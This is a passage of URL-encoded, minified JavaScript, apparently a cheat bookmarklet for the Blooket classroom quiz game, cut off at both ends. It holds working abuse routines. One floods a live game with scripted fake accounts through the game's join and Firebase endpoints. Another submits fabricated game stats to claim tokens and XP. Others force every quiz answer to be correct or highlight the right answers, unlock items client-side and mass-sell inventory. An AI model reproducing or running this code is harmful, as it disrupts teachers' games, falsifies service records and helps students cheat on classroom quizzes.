0blooks%20upon%20unlocking?%22),i=%7B%7D,s=Date.now(),t=!1;for(let%20r=0;r%3Cl&&(await%20c(%7BboxName:o%7D).then((%7BisNewToUser:e,tokens:t,unlockedBlook:o%7D)=%3E%7Bi%5Bo%5D%7C%7C=0,i%5Bo%5D++;var%20a=Date.now();n&&alert(%60$%7Bo%7D%20($%7Br+1%7D/$%7Bl%7D)%20$%7Be?%22NEW!%20%22:%22%22%7D$%7Bt%7D%20tokens%20left%60),s+=Date.now()-a%7D).catch(e=%3Et=!0),!t);r++);alert(%60($%7BDate.now()-s%7Dms)%20Results:%0A%60+Object.entries(i).map((%5Be,t%5D)=%3E%60%20%20%20%20$%7Be%7D%20%60+t).join(%60%0A%60))%7D%7D).catch(()=%3Ealert(%22There%20was%20an%20error%20user%20data!%22))%7D%7D,%7Bname:%22Flood%20Game%22,description:%22Floods%20a%20game%20with%20a%20number%20of%20fake%20accounts%22,inputs:%5B%7Bname:%22Game%20ID%22,type:%22string%22%7D,%7Bname:%22Name%22,type:%22string%22%7D,%7Bname:%22Amount%22,type:%22number%22%7D,%7Bname:%22Blook%22,type:%22options%22,options:async()=%3E%7Bvar%20e=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D;return%5B%22Random%22%5D.concat(Object.keys(Object.values(e.c).find(e=%3Ee.exports.a?.Chick&&e.exports.a?.Elephant).exports.a))%7D%7D,%7Bname:%22Banner%22,type:%22options%22,options:Object.entries(%7BStarter:%22starter%22,Chalkboard:%22chalkboard%22,Slime:%22slime%22,Bookshelf:%22bookshelf%22,%22Toaster%20Pastry%22:%22toasterPastry%22,Theater:%22theater%22,Sushi:%22sushi%22,Workbench:%22workbench%22,Spooky:%22spooky%22,Spiders:%22spiders%22,Coffin:%22coffin%22,Pumpkins:%22pumpkins%22,%22Falling%20Blocks%22:%22fallingBlocks%22,Racetrack:%22racetrack%22,Harvest:%22harvest%22,Leaves:%22leaves%22,%22Fall%20Picnic%22:%22fallPicnic%22,%22Winter%20Drive%22:%22winterDrive%22,%22Winter%20Train%22:%22winterTrain%22,Ice:%22ice%22,Gifts:%22gifts%22,%22Christmas%20Tree%22:%22christmasTree%22,%22Soccer%20Field%22:%22soccerField%22,%22Winter%20Landscape%22:%22winterLandscape%22,%22Football%20Field%22:%22footballField%22,%22Outer%20Space%22:%22outerSpace%22,%22Hockey%20Rink%22:%22hockeyRink%22,%22Music%20Class%22:%22musicClass%22,%22Ice%20Cream%20Sandwich%22:%22iceCreamSandwich%22,%22Science%20Class%22:%22scienceClass%22,%22Fish%20Tank%22:%22fishTank%22,%22Art%20Class%22:%22artClass%22,Clockwork:%22clockwork%22,%22Love%20Letter%22:%22loveLetter%22,Farm:%22farm%22,Chocolate:%22chocolate%22,%22Tech%20Chip%22:%22techChip%22,Fire:%22fire%22,%22Orange%20Ice%20Pop%22:%22orangeIcePop%22%7D).map((%5Be,t%5D)=%3E(%7Bname:e,value:t%7D))%7D%5D,run:async%20function(n,i,e,s,l)%7Bvar%20t=Object.values(webpackJsonp.push(%5B%5B%5D,%7B%22%22:(e,t,o)=%3E%7Bt.cache=o.c%7D%7D,%5B%5B%22%22%5D%5D%5D).cache);const%20c=t.find(e=%3Ee.exports?.a?.get).exports.a,d=t.find(e=%3Ee.exports?.a?.initializeApp).exports.a,u=Object.keys(Object.values(t).find(e=%3Ee.exports.a?.Black).exports.a);for(let%20r=1;r%3C=e;r++)(async()=%3E%7Bvar%20e=%22%22+i+String.fromCharCode(96+r),%7Bsuccess:t,fbToken:o,fbShardURL:a%7D=(await%20c.put(%22https://fb.blooket.com/c/firebase/join%22,%7Bid:n,name:e%7D))%5B%22data%22%5D;t&&(t=d.initializeApp(%7BapiKey:%22AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU%22,authDomain:%22blooket-2020.firebaseapp.com%22,projectId:%22blooket-2020%22,storageBucket:%22blooket-2020.appspot.com%22,messagingSenderId:%22741533559105%22,appId:%221:741533559105:web:b8cbb10e6123f2913519c0%22,measurementId:%22G-S3H5NGN10Z%22,databaseURL:a%7D,e),await(a=d.auth(t)).setPersistence(d.auth.Auth.Persistence.NONE).catch(console.error),await%20a.signInWithCustomToken(o).catch(console.error),await%20t.database().ref(n+%22/c/%22+e).set(%7Bb:%22Random%22==s?u%5BMath.floor(Math.random()*u.length)%5D:s,bg:l%7D),t.delete())%7D)(),await%20new%20Promise(e=%3EsetTimeout(e,100))%7D%7D,%7Bname:%22Change%20Blook%20Ingame%22,description:%22Changes%20your%20blook%22,inputs:%5B%7Bname:%22Blook%22,type:%22options%22,options:async()=%3E%7Bvar%20e=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D;return%20Object.keys(Object.values(e.c).find(e=%3Ee.exports.a?.Chick&&e.exports.a?.Elephant).exports.a)%7D%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode%5B%22props%22%5D;t.client.blook=e,t.liveGameController.setVal(%7Bpath:%60c/$%7Bt.client.name%7D/b%60,val:e%7D)%7D%7D,%7Bname:%22Get%20Daily%20Rewards%22,description:%22Gets%20max%20daily%20tokens%20and%20xp%22,run:async%20function()%7Bvar%20e,t,o,a=document.createElement(%22iframe%22);document.body.append(a),window.alert=a.contentWindow.alert.bind(window),a.remove(),location.href.includes(%22play.blooket.com%22)?(%7Bt%7D=(await(e=(a=Object.values(webpackJsonp.push(%5B%5B%5D,%7B%22%22:(e,t,o)=%3E%7Bt.cache=o.c%7D%7D,%5B%5B%22%22%5D%5D%5D).cache)).find(e=%3Ee.exports?.a?.get).exports.a).post(%22https://play.blooket.com/api/playersessions/solo%22,%7BgameMode:%22Factory%22,questionSetId:%5B%2260101da869e8c70013913b59%22,%22625db660c6842334835cb4c6%22,%2260268f8861bd520016eae038%22,%22611e6c804abdf900668699e3%22,%2260ba5ff6077eb600221b7145%22,%22642467af9b704783215c1f1b%22,%22605bd360e35779001bf57c5e%22,%226234cc7add097ff1c9cff3bd%22,%22600b1491d42a140004d5215a%22,%225db75fa3f1fa190017b61c0c%22,%225fac96fe2ca0da00042b018f%22,%22600b14d8d42a140004d52165%22,%225f88953cdb209e00046522c7%22,%22600b153ad42a140004d52172%22,%225fe260e72a505b00040e2a11%22,%225fe3d085a529560004cd3076%22,%225f5fc017aee59500041a1456%22,%22608b0a5863c4f2001eed43f4%22,%225fad491512c8620004918ace%22,%225fc91a9b4ea2e200046bd49a%22,%225c5d06a7deebc70017245da7%22,%225ff767051b68750004a6fd21%22,%225fdcacc85d465a0004b021b9%22,%225fb7eea20bd44300045ba495%22%5D%5BMath.floor(24*Math.random())%5D%7D))%5B%22data%22%5D,%7Bname:a,blook:%7Bname:o%7D%7D=(await%20e.post(%22https://play.blooket.com/api/playersessions/landings%22,%7Bt:t%7D),await%20e.get(%22https://play.blooket.com/api/playersessions/questions%22,%7Bparams:%7Bt:t%7D%7D),await%20a.find(e=%3Ee.exports.a?.me).exports.a.me(%7B%7D).catch(()=%3Ealert(%22There%20was%20an%20error%20getting%20user%20data.%22))),await%20e.put(%22https://play.blooket.com/api/users/factorystats%22,%7BblookUsed:o,t:t,name:a,cash:Math.floor(9e7*Math.random())+1e7,correctAnswers:Math.floor(500*Math.random())+500,upgrades:Math.floor(300*Math.random())+300,mode:%22Time-Solo%22,nameUsed:%22You%22,place:1,playersDefeated:0%7D),e.put(%22https://play.blooket.com/api/users/add-rewards%22,%7Bt:t,name:a,addedTokens:500,addedXp:300%7D).then((%7Bdata:%7BdailyReward:e%7D%7D)=%3Ealert(%60Added%20max%20tokens%20and%20xp,%20and%20got%20$%7Be%7D%20daily%20wheel%20tokens!%60)).catch(()=%3Ealert(%22There%20was%20an%20error%20when%20adding%20rewards.%22))):(alert(%22This%20cheat%20only%20works%20on%20play.blooket.com,%20opening%20a%20new%20tab.%22),window.open(%22https://play.blooket.com/%22))%7D%7D,%7Bname:%22Use%20Any%20Blook%22,description:%22Allows%20you%20to%20play%20as%20any%20blook%22,run:function()%7Bconst%20o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;var%20e=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D).webpack(%22MDrD%22).a;%22/blooks%22==location.pathname?o.setState(%7BblookData:Object.keys(e).reduce((e,t)=%3E(e%5Bt%5D=o.state.blookData%5Bt%5D%7C%7C1,e),%7B%7D),allSets:Object.values(e).reduce((e,t)=%3Ee.includes(t.set)?e:e.concat(t.set),%5B%5D)%7D):Array.isArray(o.state.unlocks)?o.setState(%7Bunlocks:Object.keys(e)%7D):o.setState(%7Bunlocks:e%7D)%7D%7D,%7Bname:%22Every%20Answer%20Correct%22,description:%22Sets%20every%20answer%20to%20be%20correct%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.freeQuestions=e.questions=e.props.client.questions.map(e=%3E(%7B...e,correctAnswers:e.answers%7D))%7D%7D,%7Bname:%22Highlight%20Answers%22,description:%22Colors%20answers%20to%20be%20red%20or%20green%20highlighting%20the%20correct%20ones%22,run:function()%7Bconst%7Bstate:o,props:a%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;%5B...document.querySelectorAll('%5Bclass*=%22answerContainer%22%5D')%5D.forEach((e,t)=%3E%7B(o.question%7C%7Ca.client.question).correctAnswers.includes((o.question%7C%7Ca.client.question).answers%5Bt%5D)?e.style.backgroundColor=%22rgb(0,%20207,%20119)%22:e.style.backgroundColor=%22rgb(189,%2015,%2038)%22%7D)%7D%7D,%7Bname:%22Remove%20Name%20Limit%22,description:%22Sets%20the%20name%20limit%20to%20120,%20which%20is%20the%20actual%20max%20name%20length%20limit%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove(),document.querySelector('input%5Bclass*=%22nameInput%22%5D').maxLength=120,alert(%22Removed%20name%20length%20limit%22)%7D%7D,%7Bname:%22Remove%20Random%20Name%22,description:%22Allows%20you%20to%20put%20a%20custom%20name%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7BisRandom:!1,client:%7Bname:%22%22%7D%7D),document.querySelector('%5Bclass*=%22nameInput%22%5D')?.focus?.()%7D%7D,%7Bname:%22Sell%20Cheap%20Duplicates%22,description:%22Sells%20all%20of%20your%20uncommon%20to%20epic%20dupes%20(not%20legendaries+)%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),window.confirm=e.contentWindow.confirm.bind(window),e.remove();let%20t=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D,o=Object.values(t.c).find(e=%3Ee.exports?.a?.get).exports.a,r=Object.values(t.c).find(e=%3Ee.exports.a?.sellBlook).exports.a%5B%22sellBlook%22%5D;o.get(%22https://dashboard.blooket.com/api/users%22).then(async(%7Bdata:%7Bunlocks:e%7D%7D)=%3E%7Be=Object.entries(e).filter((%5Be,t%5D)=%3E1%3Ct&&!%5B%22Legendary%22,%22Chroma%22,%22Mystical%22%5D.includes(webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D).webpack(%22MDrD%22).a%5Be%5D.rarity));if(confirm(%22Are%20you%20sure%20you%20want%20to%20sell%20your%20uncommon%20to%20epic%20dupes?%22))%7Bvar%20t,o,a=Date.now();for(%5Bt,o%5Dof%20e)await%20r(%7Bblook:t,numToSell:o-1%7D);alert(%60($%7BDate.now()-a%7Dms)%20Results:%0A%60+e.map((%5Be,t%5D)=%3E%60%20%20%20%20$%7Be%7D%20%60+(t-1)).join(%60%0A%60))%7D%7D).catch(()=%3Ealert(%22There%20was%20an%20error%20user%20data!%22))%7D%7D,%7Bname:%22Sell%20Duplicate%20Blooks%22,description:%22Sell%20all%20duplicate%20blooks%20leaving%20you%20with%201%20each%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),window.confirm=e.contentWindow.confirm.bind(window),e.remove();let%20t=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D,o=Object.values(t.c).find(e=%3Ee.exports?.a?.get).exports.a,r=Object.values(t.c).find(e=%3Ee.exports.a?.sellBlook).exports.a%5B%22sellBlook%22%5D;o.get(%22https://dashboard.blooket.com/api/users%22).then(async(%7Bdata:%7Bunlocks:e%7D%7D)=%3E%7Be=Object.entries(e).filter(e=%3E1%3Ce%5B1%5D);if(confirm(%22Are%20you%20sure%20you%20want%20to%20sell%20your%20dupes?%22))%7Bvar%20t,o,a=Date.now();for(%5Bt,o%5Dof%20e)await%20r(%7Bblook:t,numToSell:o-1%7D);alert(%60($%7BDate.now()-a%7Dms)%20Results:%0A%60+e.map((%5Be,t%5D)=%3E%60%20%20%20%20$%7Be%7D%20%60+(t-1)).join(%60%0A%60))%7D%7D).catch(e=%3E(alert(%22There%20was%20an%20error%20user%20data!%22),console.info(e)))%7D%7D,%7Bname:%22Simulate%20Pack%22,description:%22Simulate%20opening%20a%20pack%22,inputs:%5B%7Bname:%22Pack%22,type:%22options%22,options:async()=%3EArray.from(document.querySelectorAll('%5Bclass*=%22packShadow%22%5D')).map(e=%3Ee.alt)%7D%5D,run:function()%7Btry%7Blet%20m=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D,e=Object.values(m.c),t=e.find(e=%3Ee.exports?.a?.Chick?.set).exports.a,a=e.find(e=%3Ee.exports.a?.Breakfast).exports.a,r=(Object.entries(t).reduce((e,%5Bt,o%5D)=%3E(a%5Bo.realSet%7C%7Co.set%5D&&(e%5Bt%5D=o),e),%7B%7D),Object.values(m.c).find(e=%3Ee.exports?.Class).exports),h=%7B%7D;class%20i%20extends%20r.Scene%7Bconstructor(e)%7Bsuper(),this.rarity=e.toLowerCase()%7Dpreload()%7Bswitch(this.rarity)%7Bcase%22uncommon%22:this.load.svg(%22uncommon-1%22,%22https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_green.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22uncommon-2%22,%22https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_light_green.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22uncommon-3%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/circle_dark_green.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22uncommon-4%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_dark_green.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22uncommon-5%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_light_green.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22uncommon-6%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_light_green.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22uncommon-7%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_green.svg%22,%7Bwidth:30,height:30%7D);break;case%22rare%22:this.load.svg(%22rare-1%22,%22https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_light_blue.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22rare-2%22,%22https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_dark_blue.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22rare-3%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-4%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-5%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_light_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-6%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_light_blue.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22rare-7%22,%22https://media.blooket.com/image/upload/v1658567763/Media/market/particles/circle_dark_blue.svg%22,%7Bwidth:25,height:25%7D);break;case%22epic%22:this.load.svg(%22epic-1%22,%22https://media.blooket.com/image/upload/v1658790239/Media/market/particles/red.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22epic-2%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/light_red.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22epic-3%22,%22https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-4%22,%22https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_dark_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-5%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-6%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_light_red.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22epic-7%22,%22https://media.blooket.com/image/upload/v1658790237/Media/market/particles/circle_dark_red.svg%22,%7Bwidth:25,height:25%7D);break;case%22legendary%22:this.load.svg(%22legendary-1%22,%22https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-2%22,%22https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_light_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-3%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-4%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_orange.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22legendary-5%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_light_orange.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22legendary-6%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_dark_orange.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22legendary-7%22,%22https://media.blooket.com/image/upload/v1658567738/Media/market/particles/triangle_dark_orange.svg%22,%7Bwidth:30,height:30%7D);break;case%22chroma%22:this.load.svg(%22chroma-1%22,%22https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_turquoise.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22chroma-2%22,%22https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_light_turquoise.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22chroma-3%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_dark_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-4%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-5%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-6%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_light_turquoise.svg%22,%7Bwidth:30,height:30%7D),this.load.svg(%22chroma-7%22,%22https://media.blooket.com/image/upload/v1658790244/Media/market/particles/circle_dark_turquoise.svg%22,%7Bwidth:25,height:25%7D)%7D%7Dcreate()%7Bh.scene=this,h.rarity=%22%22,h.particles=this.physics.add.group(%7BclassType:new%20r.Class(%7BExtends:r.GameObjects.Image,initialize:function()%7Br.GameObjects.Image.call(this,h.scene,0,0,%22uncommon-1%22),this.setDepth(3),this.lifespan=0%7D,spawn:function(e,t,o,a,r,n,i,s,l)%7Bthis.setTexture(l),this.setActive(!0),this.setVisible(!0),this.setPosition(e,t),this.setScale(o),this.targets=%5B%5D,h.scene.physics.velocityFromAngle(a,r,this.body.velocity),this.body.setGravityY(n),this.body.setAngularVelocity(i),this.lifespan=s%7D,update:function(e,t)%7Bthis.lifespan-=t,0%3Cthis.lifespan%7C%7C(this.setActive(!1),this.setVisible(!1))%7D%7D),runChildUpdate:!0%7D),this.nextParticle=0,this.numExplosions=0,this.game.events.on(%22start-particles%22,e=%3E%7Bh.rarity=e,this.numExplosions=%22Uncommon%22===e?75:%22Rare%22===e?100:-1%7D)%7Dupdate(e,t)%7Bconst%20o=m(%2274sb%22);function%20a(e)%7Bswitch(e)%7Bcase%22center%22:var%20t=Object(o.l)(-115,-65);return%7Bx:h.scene.cameras.main.worldView.width/2,y:h.scene.cameras.main.worldView.height/2,scale:Object(o.l)(.7,1),angle:t,velocity:Object(o.l)(600,750),gravity:700,angVelocity:(-90%3Ct?1:-1)*Object(o.l)(125,175),lifespan:2500%7D;case%22right-bottom%22:return%7Bx:h.scene.cameras.main.worldView.width,y:h.scene.cameras.main.worldView.height,scale:Object(o.l)(.7,1),angle:Object(o.l)(-160,-110),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(-175,-125),lifespan:2500%7D;case%22left-bottom%22:return%7Bx:0,y:h.scene.cameras.main.worldView.height,scale:Object(o.l)(.7,1),angle:Object(o.l)(-70,-20),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(125,175),lifespan:2500%7D;case%22top%22:return%7Bx:Object(o.l)(0,h.scene.cameras.main.worldView.width),y:-50,scale:Object(o.l)(.7,1),angle:90,velocity:Object(o.l)(0,50),gravity:700,angVelocity:Object(o.l)(-150,150),lifespan:2500%7D;case%22right-shower%22:return%7Bx:h.scene.cameras.main.worldView.width,y:Object(o.l)(0,h.scene.cameras.main.worldView.height),scale:Object(o.l)(.7,1),angle:Object(o.l)(-180,-130),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(-175,-125),lifespan:2500%7D;case%22left-shower%22:return%7Bx:0,y:Object(o.l)(0,h.scene.cameras.main.worldView.height),scale:Object(o.l)(.7,1),angle:Object(o.l)(-50,0),velocity:Object(o.l)(600,750),gravity:500,angVelocity:Object(o.l)(125,175),lifespan:2500%7D;case%22right-diamond%22:t=Object(o.l)(0,h.scene.cameras.main.worldView.height);return%7Bx:h.scene.cameras.main.worldView.width,y:t,scale:Object(o.l)(.7,1),angle:t%3Eh.scene.cameras.main.worldView.height/2?-150:-210,velocity:Object(o.l)(600,750),gravity:0,angVelocity:Object(o.l)(-175,-125),lifespan:2500%7D;case%22left-diamond%22:t=Object(o.l)(0,h.scene.cameras.main.worldView.height);return%7Bx:0,y:t,scale:Object(o.l)(.7,1),angle:t%3Eh.scene.cameras.main.worldView.height/2?-30:30,velocity:Object(o.l)(600,750),gravity:0,angVelocity:Object(o.l)(125,175),lifespan:2500%7D;default:return%7B%7D%7D%7Dif(h.rarity&&0!==this.numExplosions&&(this.nextParticle-=t,this.nextParticle%3C=0))%7Bswitch(h.rarity)%7Bcase%22Uncommon%22:for(let%20e=0;e%3C2;e++)%7Bvar%20r=h.particles.get();r&&r.spawn.apply(r,Object.values(a(%22center%22)).concat(%22uncommon-%22+Object(o.m)(1,8)))%7Dbreak;case%22Rare%22:for(var%20n=0;n%3C2;n++)%7Bvar%20i=h.particles.get();i&&i.spawn.apply(i,Object.values(a(n%252==0?%22left-bottom%22:%22right-bottom%22)).concat(%22rare-%22+Object(o.m)(1,8)))%7Dbreak;case%22Epic%22:for(var%20s=0;s%3C2;s++)%7Bvar%20l=h.particles.get();l&&l.spawn.apply(l,Object.values(a(s%252==0?%22left-shower%22:%22right-shower%22)).concat(%22epic-%22+Object(o.m)(1,8)))%7Dbreak;case%22Legendary%22:for(var%20c=0;c%3C3;c++)%7Bvar%20d=h.particles.get();d&&d.spawn.apply(d,Object.values(a(%22top%22)).concat(%22legendary-%22+Object(o.m)(1,8)))%7Dbreak;case%22Chroma%22:for(var%20u=0;u%3C3;u++)%7Bvar%20p=h.particles.get();p&&p.spawn.apply(p,Object.values(a(u%252==0?%22left-diamond%22:%22right-diamond%22)).concat(%22chroma-%22+Object(o.m)(1,8)))%7D%7Dthis.nextParticle=20,0%3Cthis.numExplosions&&(this.numExplosions=Math.max(this.numExplosions-1,0))%7D%7D%7Dreturn%20function(e)%7Bif(%22/market%22!==window.location.pathname)return%20alert(%22This%20must%20be%20ran%20on%20the%20market%20page%22);var%20t,o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;let%20n=m(%22fGzD%22);(n=Object.keys(n.a).reduce((e,t)=%3E(e.packs.includes(t)&&(e.data%5Bt%5D=Object.fromEntries(n.b(t))),e),%7Bpacks:Array.from(document.querySelectorAll('%5Bclass*=%22packShadow%22%5D')).map(e=%3Ee.alt),data:%7B%7D%7D).data)%5Be%5D?(e=function(e)%7Bvar%20t=%5B%5D,o=Object.keys(n%5Be%5D);for(const%20r%20of%20o)t.push(n%5Be%5D%5Br%5D+(t%5Bo.indexOf(r)-1%5D%7C%7C0));const%20a=t%5Bt.length-1%5D*Math.random();return%20o%5Bt.findIndex(e=%3Ee%3E=a)%5D%7D(e),t=Object.values(m.c).find(e=%3Ee.exports?.a?.Elephant).exports.a,o.setState(%7BloadingPack:!1,openPack:!0,unlockedBlook:e,tokens:o.state.tokens,newUnlock:!0,game:%7Btype:r.WEBGL,parent:%22phaser-market%22,width:%22100%25%22,height:%22100%25%22,scale:%7Bmode:r.Scale.NONE,autoCenter:r.Scale.CENTER_BOTH%7D,transparent:!0,physics:%7Bdefault:%22arcade%22%7D,scene:new%20i(t%5Be%5D.rarity)%7D,canOpen:!0%7D)):alert(%22I%20couldn't%20find%20that%20box!%22)%7D%7Dcatch%7B%7D%7D()%7D,%7Bname:%22Simulate%20Unlock%22,description:%22Simulate%20unlocking%20most%20of%20the%20blooks%22,inputs:%5B%7Bname:%22Blook%22,type:%22options%22,options:()=%3E%7Btry%7Bvar%20e=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D,t=Object.values(e.c);const%20a=t.find(e=%3E%22number%22==typeof%20e.exports.a?.Breakfast).exports.a;return%20Object.entries(t.find(e=%3Ee.exports.a?.Black).exports.a).reduce((e,%5Bt,o%5D)=%3Ea%5Bo.realSet%7C%7Co.set%5D?e.concat(t):e,%5B%5D)%7Dcatch%7Breturn%5B%5D%7D%7D%7D%5D,run:function()%7Btry%7Blet%20m=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D,e=Object.values(m.c),t=e.find(e=%3Ee.exports?.a?.Black).exports.a,a=e.find(e=%3E%22number%22==typeof%20e.exports.a?.Breakfast).exports.a,o=Object.entries(t).reduce((e,%5Bt,o%5D)=%3E(a%5Bo.realSet%7C%7Co.set%5D&&(e%5Bt%5D=o),e),%7B%7D),r=e.find(e=%3Ee.exports?.Class).exports,h=%7B%7D;class%20n%20extends%20r.Scene%7Bconstructor(e)%7Bsuper(),this.rarity=e.toLowerCase()%7Dpreload()%7Bswitch(this.rarity)%7Bcase%22uncommon%22:this.load.svg(%22uncommon-1%22,%22https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_green.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22uncommon-2%22,%22https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_light_green.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22uncommon-3%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/circle_dark_green.svg%22,%7Bwidth:25,height:25%7D),this.load.svg(%22uncommon-4%22,%22https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_dark_green.svg%22,%7Bw